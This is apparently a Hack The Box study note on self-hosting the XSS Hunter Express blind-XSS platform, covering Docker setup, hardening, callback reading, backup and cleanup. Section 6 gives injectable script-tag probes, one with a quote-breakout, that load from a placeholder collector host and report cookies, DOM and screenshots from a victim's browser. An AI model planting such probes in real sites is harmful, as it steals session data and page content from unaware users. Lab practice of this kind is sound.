---
title: "Blind XSS Tool - XSS Hunter"
description: "XSS Hunter Express is a self-hosted blind-XSS reporting platform. When its generated probe executes in an unseen HTB browser, the platform can record the…"
category: web
tags: ["web", "xss"]
tools: []
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Web/Blind XSS Tool - XSS Hunter.md"
---
# Blind XSS Tool — XSS Hunter `fas:ClipboardList`

## Summary `ris:Eye`

[XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) is a self-hosted blind-XSS reporting platform. When its generated probe executes in an unseen HTB browser, the platform can record the vulnerable URI, origin, referrer, user agent, non-`HttpOnly` cookies, page DOM, screenshots, and request metadata. Use it when a simple DNS or HTTP callback is insufficient and the lab requires evidence from an administrator-facing or asynchronous rendering path.

> [!danger]+ HTB-Only Boundary
> `fas:TriangleExclamation`
> 1. Deploy probes only into Hack The Box labs or systems you own and are explicitly authorised to test.
> 2. The collector may receive session data, DOM content, screenshots, and internal URLs. Treat its database and image directory as sensitive.
> 3. Use a dedicated hostname, strong credentials, minimal exposure, and short retention.
> 4. See Cross-Site Scripting (XSS) - HTB Cheat Sheet for payload selection and evidence rules.

---

## Conceptual Information `ris:GlobalLine`

### When to Use XSS Hunter

| Requirement | Fit |
|---|---|
| Confirm a single DNS or HTTP interaction | Use Blind XSS Tool - Interactsh instead |
| Capture screenshots and DOM context | **Strong fit** |
| Correlate many stored fields | **Strong fit** with unique probe paths |
| Avoid operating internet-facing infrastructure | Use a hosted OAST service or a local listener where routing permits |
| Fine-grained payload/report controls | Compare with Blind XSS Tool - ezXSS |

### Data Flow

1. An HTB field stores the generated `<script src>` probe.
2. A lab administrator or automated browser renders the field.
3. The browser requests the XSS Hunter probe over HTTPS.
4. The probe collects its configured evidence and posts a report to the collector.
5. The dashboard and optional notification channel expose the callback.

> [!warning]+ Security Model
> `fas:TriangleExclamation`
> 1. XSS Hunter is itself an internet-facing web application and evidence store.
> 2. Do not reuse its root domain for email, production websites, or unrelated services.
> 3. Restrict the admin panel at the firewall or reverse proxy when possible.
> 4. If the control panel is disabled, verify how reports will be reviewed before planting probes.

---

## Prerequisites `ris:FileList`

| Requirement | Minimum or recommendation | Check |
|---|---|---|
| Linux VPS | At least **2 GB RAM** per the project README | `free -h` |
| Docker Engine | Current supported release | `docker --version` |
| Docker Compose | Compose v2 preferred; legacy `docker-compose` is also accepted by the project | `docker compose version` |
| Dedicated hostname | Short name such as `x.YOUR_DOMAIN` | `dig +short x.YOUR_DOMAIN` |
| DNS control | Public `A`/`AAAA` record pointing to the VPS | DNS provider panel |
| Inbound ports | TCP `80` and `443` for HTTP/TLS | VPS firewall and cloud firewall |
| Optional notifications | Valid provider credentials | Provider dashboard |

> [!important]+ Before Installation
> `fas:TriangleExclamation`
> 1. Create the hostname and wait until it resolves to the server.
> 2. Ensure no other service occupies TCP `80` or `443`.
> 3. Record a rollback point or VPS snapshot.
> 4. Generate unique passwords and keep secrets out of shell history and screenshots.

---

## Commands and Implementation `ris:Command`

### 1. Verify DNS and Ports

```bash
dig +short x.YOUR_DOMAIN
curl -4 https://icanhazip.com
sudo ss -lntp '( sport = :80 or sport = :443 )'
```

> [!info]+ Preflight Breakdown
> `ris:Radar`
> 1. **`dig`**: The hostname should resolve to the VPS public address.
> 2. **Public IP check**: Confirms the address expected in DNS.
> 3. **`ss`**: Output should be empty before XSS Hunter starts unless a planned reverse proxy owns the ports.

### 2. Clone and Inspect the Production Compose Repository

```bash
git clone https://github.com/mandatoryprogrammer/xsshunter-express.git
cd xsshunter-express
git status --short
docker compose config --services
```

> [!info]+ Command Breakdown
> `ris:Command`
> 1. **Repository**: Uses the original XSS Hunter Express repository because its current Compose file contains the documented production hostname, TLS, SMTP, storage, and database settings.
> 2. **`git status --short`**: Establishes a clean baseline before configuration edits.
> 3. **`docker compose config --services`**: Validates the Compose file and prints the actual service names before startup.

> [!warning]+ Truffle Security Fork Status
> `fas:TriangleExclamation`
> 1. The [Truffle Security fork](https://github.com/trufflesecurity/xsshunter) contains newer application changes.
> 2. As verified on **2026-08-08**, its README still describes the legacy automatic-TLS Compose workflow, while its actual Compose file expects an untracked `dev.env`, binds to `127.0.0.1:8080`, and references a Google Cloud credential mount.
> 3. Do not follow that README as a turnkey production deployment without supplying and auditing the missing environment, reverse-proxy, TLS, database, and storage configuration.

### 3. Configure the Compose File

Edit the repository's `docker-compose.yml` and replace the sample values.

| Setting | Required value | Security note |
|---|---|---|
| `HOSTNAME` | `x.YOUR_DOMAIN` | Use a dedicated, short hostname that already resolves |
| `SSL_CONTACT_EMAIL` | Your certificate contact address | Used for automated Let's Encrypt issuance and renewal |
| `MAX_PAYLOAD_UPLOAD_SIZE_MB` | A bounded lab-appropriate limit | Large DOM and screenshot reports consume disk and memory |
| `CONTROL_PANEL_ENABLED` | `true` for dashboard use | Restrict panel access; disable only after confirming an alternate report path |
| `SMTP_EMAIL_NOTIFICATIONS_ENABLED` | `false` unless configured | Avoid broken or unintended outbound mail |
| `SMTP_HOST`, `SMTP_PORT`, `SMTP_USE_TLS` | Matching provider settings | Prefer a lab-only notification account |
| `SMTP_USERNAME`, `SMTP_PASSWORD` | Lab-only provider credentials | Store as secrets and rotate after exposure |
| `SMTP_FROM_EMAIL`, `SMTP_RECEIVER_EMAIL` | Deliberate sender and receiver | Avoid forwarding full reports to broad mailboxes |
| `DATABASE_USER`, `DATABASE_PASSWORD` | Random unique values | Change both application and PostgreSQL values consistently |

```bash
cp docker-compose.yml docker-compose.yml.pre-htb
${EDITOR:-vi} docker-compose.yml
docker compose config >/dev/null
```

> [!info]+ Configuration Breakdown
> `ris:FileList`
> 1. The copy provides a local rollback reference without exposing secrets elsewhere.
> 2. **`docker compose config`** resolves the configuration and fails on malformed YAML or missing values.
> 3. Do not commit the configured Compose file if it contains credentials.

### 4. Start PostgreSQL, Then XSS Hunter

The upstream instructions start the database first and run the application in the foreground for the initial setup.

```bash
docker compose up -d postgresdb
docker compose up xsshunterexpress
```

> [!info]+ Startup Breakdown
> `fas:Terminal`
> 1. **`postgresdb`**: Starts the evidence database in the background.
> 2. **`xsshunterexpress`**: Runs the application in the foreground so the initial administrator password and TLS messages are visible.
> 3. The first HTTPS request can be slower while the service obtains a certificate.
> 4. Legacy environments may require `docker-compose` in place of `docker compose`.

After recording the generated admin password, start the full stack in the background:

```bash
docker compose up -d
docker compose ps
docker compose logs --tail=100 xsshunterexpress
```

> [!success]+ Expected Result
> `ris:Key`
> 1. The services show a running state.
> 2. `https://x.YOUR_DOMAIN/admin/` presents the control-panel login.
> 3. TLS is valid for the configured hostname.

### 5. First Login and Hardening

1. Browse to `https://x.YOUR_DOMAIN/admin/`.
2. Sign in using the generated password shown during first startup.
3. Store the credential in a password manager.
4. Restrict the admin path to your VPN or trusted source IP at the cloud firewall or reverse proxy.
5. Verify email notifications only if they are deliberately configured.
6. Review the configured secondary payload and leave it empty for the initial HTB test.
7. Submit the project's test probe in your own isolated browser and confirm that a report appears.

### 6. Generate an HTB Blind-XSS Probe

Copy the probe exactly as generated by your instance. A typical shape is:

```html
<script src="https://x.YOUR_DOMAIN/GENERATED_PROBE_PATH"></script>
```

For a quoted attribute context, break out only after confirming the quote type:

```html
"><script src="https://x.YOUR_DOMAIN/GENERATED_PROBE_PATH"></script>
```

> [!warning]+ Probe Placement
> `fas:TriangleExclamation`
> 1. Use a distinct probe or path label for every HTB field.
> 2. Record the request, field name, account, and timestamp before submission.
> 3. Begin with one field to avoid ambiguous callbacks.
> 4. Do not guess the generated endpoint; copy it from your own dashboard.

### 7. Interpret a Callback

| Field | What it establishes | Limitation |
|---|---|---|
| Vulnerable URI | Page that rendered the probe | Redirects or SPA routes may alter it |
| Origin | Browser security origin | Does not by itself identify the user |
| Referrer | Navigation or embedding context | May be reduced by referrer policy |
| User agent | Browser/automation fingerprint | Can be generic or spoofed |
| Cookies | JavaScript-readable cookies | `HttpOnly` cookies are absent |
| DOM | Rendered page structure | May contain sensitive lab content |
| Screenshot | Visual evidence of affected view | Treat as sensitive and minimise retention |
| Responsible request | Injection request when supported | Requires compatible tooling or metadata |

> [!success]+ Evidence Standard
> `ris:Key`
> 1. Correlate the callback to the unique field and timestamp.
> 2. Save only the evidence needed to prove the lab objective.
> 3. Report the affected role and page separately from the injecting account.
> 4. Delete reports, screenshots, and stored probes after completing the lab.

---

## Operations and Lifecycle `ris:FileList`

### Logs and Health

```bash
docker compose ps
docker compose logs --tail=200 xsshunterexpress
docker compose logs --tail=100 postgresdb
docker stats --no-stream
```

> [!info]+ Operational Checks
> `ris:FileList`
> 1. Application logs expose TLS, configuration, callback, and startup errors.
> 2. Database logs expose storage and authentication failures.
> 3. Resource checks are important on the project's minimum-size VPS.

### Backup

Stop the stack briefly and archive the repository's persistent data paths and configured Compose file.

```bash
docker compose stop
cd ..
tar -czf "xsshunter-backup-$(date +%F).tar.gz" \
  xsshunter-express/docker-compose.yml \
  xsshunter-express/postgres-db-data \
  xsshunter-express/payload-fire-images \
  xsshunter-express/ssldata
cd xsshunter-express
docker compose start
```

> [!warning]+ Backup Handling
> `fas:TriangleExclamation`
> 1. Confirm the actual bind-mount paths with `docker compose config` before archiving.
> 2. The archive can contain credentials, cookies, DOM captures, and screenshots.
> 3. Encrypt the archive and keep it only as long as the HTB exercise requires.

### Update

```bash
git status --short
git pull --ff-only
docker compose pull
docker compose up -d --build
docker compose ps
```

> [!info]+ Update Breakdown
> `ris:Command`
> 1. Back up first and review upstream release notes or repository changes.
> 2. **`--ff-only`** refuses an unexpected merge.
> 3. **`--build`** rebuilds the application image from the updated source.
> 4. Re-run a self-test probe after the update.

### Stop and Cleanup

Preserve evidence volumes while stopping services:

```bash
docker compose down
```

Remove Compose-managed volumes only after exporting required HTB evidence:

```bash
docker compose down --volumes
```

> [!danger]+ Destructive Cleanup
> `fas:TriangleExclamation`
> 1. `--volumes` can permanently remove the Compose-managed database volume.
> 2. Bind-mounted directories may remain and must be reviewed separately.
> 3. Keep the encrypted backup until you verify that the lab report contains everything required, then dispose of it securely.

---

## Troubleshooting `ris:FileList`

> [!failure]+ Certificate Issuance Fails
> `fas:CircleXmark`
> 1. Confirm `HOSTNAME` resolves publicly to the VPS.
> 2. Confirm inbound TCP `80` and `443` are permitted and not occupied.
> 3. Verify the certificate contact address and inspect application logs.
> 4. Avoid placing a proxy or CDN in front until initial issuance succeeds unless the repository documents that topology.

> [!failure]+ Admin Password Is Not Visible
> `fas:CircleXmark`
> 1. Run `docker compose up xsshunterexpress` in the foreground and inspect the initial logs.
> 2. Confirm whether an existing database caused initialisation to be skipped.
> 3. Preserve the data directory before any reset; deleting it destroys reports and credentials.

> [!failure]+ Probe Loads but No Report Appears
> `fas:CircleXmark`
> 1. Check browser Console and Network for CSP, TLS, mixed-content, or blocked-request errors.
> 2. Confirm the callback endpoint is reachable from the HTB browser.
> 3. Inspect both application and database logs.
> 4. Test the generated probe on an isolated page you control before changing the HTB payload.

> [!failure]+ Dashboard Is Reachable Publicly
> `fas:CircleXmark`
> 1. Restrict the admin path by source IP or VPN at the firewall/reverse proxy.
> 2. Rotate the administrator password if exposure was unintended.
> 3. Review logs for unknown access and rotate any notification secrets stored in configuration.

---

## Lessons Learned `fas:Lightbulb`

1. XSS Hunter is most valuable when the lab requires context beyond a single callback.
2. Unique probes make stored-field attribution reliable and prevent duplicate callback confusion.
3. The evidence store is sensitive infrastructure and needs the same lifecycle discipline as any other assessment database.
4. A successful probe proves browser-side execution; every additional impact claim requires separate evidence.

---

## References `fas:BookOpen`

1. [XSS Hunter Express Repository](https://github.com/mandatoryprogrammer/xsshunter-express)
2. [Truffle Security XSS Hunter Fork](https://github.com/trufflesecurity/xsshunter)
3. [Docker Engine Installation](https://docs.docker.com/engine/install/)
4. [Docker Compose Documentation](https://docs.docker.com/compose/)
5. [Let's Encrypt Documentation](https://letsencrypt.org/docs/)
6. Cross-Site Scripting (XSS) - HTB Cheat Sheet
7. Blind XSS Tool - ezXSS
8. Blind XSS Tool - Interactsh

#HTB #WebSecurity #XSS #BlindXSS #XSSHunter
